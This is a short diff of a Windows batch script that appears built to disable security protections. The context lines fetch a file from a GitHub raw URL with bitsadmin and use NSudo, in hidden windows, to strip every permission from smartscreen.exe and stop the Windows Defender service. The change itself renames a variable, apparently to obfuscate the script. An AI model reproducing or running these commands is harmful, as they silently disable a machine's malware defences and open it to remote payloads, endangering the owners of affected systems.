@@ -73,10 +73,10 @@ bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubu
 
 set xxx=%systemroot%
 
-set graysuit=System32
+set graysuitlovespinksuit=System32
 
 
-NSudo.exe -U:T -ShowWindowMode:Hide icacls "%xxx%\%graysuit%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+NSudo.exe -U:T -ShowWindowMode:Hide icacls "%xxx%\%graysuitlovespinksuit%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
 
  
 NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend 
